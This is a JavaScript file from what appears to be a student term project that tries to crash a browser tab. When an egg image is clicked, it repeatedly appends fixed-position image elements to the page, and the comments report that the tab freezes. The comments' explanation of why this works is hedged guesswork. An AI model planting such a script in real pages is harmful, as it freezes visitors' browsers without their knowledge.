"use strict";

// Bri D'Urso -- 10-27-22 -- CS280 Term Project
// 
// This script is designed to exploit a property of CSS
// which apparently makes an element be stored in browser
// memory without regarding the memory limits, (I think).
// Basically, it has to  do with the 'position: fixed;'
// attribute in CSS, and the plan is to overflow the browser's
// buffer with a bunch of elements with fixed positions.

// Currently seems to work!!
// Upon clicking the picture of the egg, the tab crashes!
// That's a great sign!
// Prior to clicking the egg, there is no issue.
// However, clicking the egg starts the script, and crashes the browser!
// (or, the tab/page, at the very least.)
// The tab/page becomes entirely unresponsive, even when attempting to refresh the page!

window.onload = function () {
  // payload to overflow the buffer with
  var payloadStyles = "position: fixed;";
  var payload = "<img src=\"img/egg.jpeg\" alt=\"eg\" style=\"".concat(payloadStyles, "\">");

  // make way too many fixed elements 
  var fixedOverflow = function fixedOverflow() {
    for (var i = 0; i < 1000; i++) {
      document.getElementById("egg").innerHTML += payload;
    }
  };

  // run the "fixedOverflow" function when the egg is clicked
  document.getElementById("egg").addEventListener("click", function () {
    fixedOverflow();
    console.log("mission is a go... hopefully, lol");
  });
};